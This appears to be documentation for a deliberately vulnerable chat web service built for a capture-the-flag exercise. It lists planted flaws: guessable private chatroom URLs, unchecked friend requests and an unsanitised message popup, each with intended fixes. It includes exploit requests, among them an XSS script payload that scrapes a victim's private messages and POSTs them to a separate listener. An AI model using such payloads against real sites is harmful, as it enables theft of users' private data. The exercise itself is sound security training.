Service documentation
======================
# Service Structure
![Service Structure](Service%20Structure.svg)
Register, Login requests and the home page are handled by the server.js. All other requests are routed to separate controllers. The controllers use models to interact with the database. The views are rendered using ejs templates.
# Functionality
- Chatrooms
- Private Messages
- Friend Requests
- Profiles
- Profile Posts
# Vulnerabilities
## Access to private chatrooms
### Insecure URL generation

- Category: Misconfiguration
- Difficulty: Easy

Using the name of a private chatroom, it is possible to join the chatroom.
### Friend requests

- Category: Authorization
- Difficulty: Easy

Friend requests can be sent or accepted by anyone. This allows anyone to view any profile and see which chatrooms they are a member of.
### Exploit
    post http://localhost:3000/friends/requests body: {"userName":"foo", "partner":"bar", "status": "send"}
    post http://localhost:3000/friends/requests body: {"userName":"bar", "partner":"foo", "status": "accept"}
    get http://localhost:3000/profile/bar
    get http://localhost:3000/chatrooms/secret
### Intended Fixes
1. Change URL generation to be independent of the chatroom name.
2. Add check that the user sending the request is the same as the userName in the request body. And check that the user accepting the request is the same as the partner in the request body.
## Cross-Site Scripting (XSS)

- Category: XSS
- Difficulty: Medium

The new private message popup is vulnerable to XSS. The message is not sanitized and can be used to execute arbitrary JavaScript code.
The checker uses a headless browser to retrieve the flag from the private messages, and will load through as many unread messages as possible.
### Exploit
    post http://localhost:3000/messages body: {"recipient":"foo", "message":"<script>function getText(){let text='';let messages = document.getElementsByClassName('message');for(let i = 0; i < messages.length; i++){text += messages[i].innerHTML;}return text; }fetch('http://localhost:6452/', {method: 'POST', body:'flag=' + getText(),headers: { 'Content-Type': 'application/x-www-form-urlencoded', },}); </script>"}
### Intended Fix
Change the ejs tag to '<%= unreadMessage.text%>' instead of '<%- unreadMessage.text%>' to sanitize the message.

